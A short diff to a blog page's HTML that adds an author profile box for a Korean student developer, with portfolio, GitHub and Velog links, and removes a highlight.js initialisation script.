             </div>
+            <aside class="author-box">
+                <img src="/img/about/me.webp" width="56" height="56" alt="노정원 프로필 사진" loading="lazy">
+                <div>
+                    <strong>노정원 (njwon)</strong>
+                    <p>수원정보과학고등학교에 재학 중인 네트워크·정보보안·백엔드·인프라 개발자.
+                    <a href="/" rel="author">포트폴리오 보기</a> · <a href="https://github.com/njwon" rel="me noopener" target="_blank">GitHub</a> · <a href="https://velog.io/@njw" rel="me noopener" target="_blank">Velog</a></p>
+                </div>
+            </aside>
         </article>
     </main>
 
@@ -257,9 +270,6 @@ app.run(host=&quot;0.0.0.0&quot;, port=8000)
         window.addEventListener('scroll', function () {
             if (!scrolled && window.scrollY > 120) { scrolled = true; header.classList.add('scrolled'); }
             else if (scrolled && window.scrollY < 30) { scrolled = false; header.classList.remove('scrolled'); }
-        });
-        window.addEventListener('DOMContentLoaded', function () {
-            if (typeof hljs !== 'undefined') document.querySelectorAll('pre code').forEach(function (b) { hljs.highlightElement(b); });
         });
     })();
     </script>
